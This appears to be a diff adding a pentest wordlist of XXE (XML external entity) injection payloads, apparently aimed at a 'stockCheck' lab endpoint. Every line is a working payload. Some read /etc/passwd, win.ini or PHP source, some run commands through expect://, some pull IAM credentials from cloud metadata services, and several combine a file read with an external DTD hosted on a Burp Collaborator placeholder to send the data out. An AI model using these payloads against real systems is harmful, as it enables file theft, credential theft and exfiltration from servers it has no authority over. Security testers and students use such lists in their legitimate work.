@@ -1,0 +1,37 @@
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "//BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+<!DOCTYPE stockCheck[<!ENTITY%xxe SYSTEM"http://BURP-COLLABORATOR-SUBDOMAIN">%xxe;]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "file:///c:/windows/win.ini"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "expect://id"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "expect://ls -la"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "ftp://BURP-COLLABORATOR-SUBDOMAIN:21/xxe"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "gopher://BURP-COLLABORATOR-SUBDOMAIN:8080/_GET /xxe"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "dict://BURP-COLLABORATOR-SUBDOMAIN:11211/xxe"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "jar:http://BURP-COLLABORATOR-SUBDOMAIN/xxe.jar!/xxe.dtd"> %xxe; ]>
+<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+﻿<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN%0a"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN%0d"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN%09"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN%20"> %xxe; ]>
+<root><stockCheck><!DOCTYPE xxe [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]></stockCheck></root>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe;]>
+<!DOCTYPE stockCheck SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd" [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %remote;]>
+<!DOCTYPE stockCheck [<!ENTITY % dtd SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %dtd;]>
+<!DOCTYPE stockCheck [<!ENTITY % payload SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %payload;]>
+<!DOCTYPE stockCheck [<!ENTITY % blind SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %blind;]>
+<!DOCTYPE stockCheck [<!ENTITY % oob SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %oob;]>
+<!DOCTYPE stockCheck [<!ENTITY % shell SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %shell;]>
+<!DOCTYPE stockCheck [<!ENTITY % exfil SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %exfil;]>
+<!DOCTYPE stockCheck [<!ENTITY % data SYSTEM "file:///etc/passwd"> <!ENTITY % oob SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %oob;]>
+<!DOCTYPE stockCheck [<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> <!ENTITY % oob SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %oob;]>
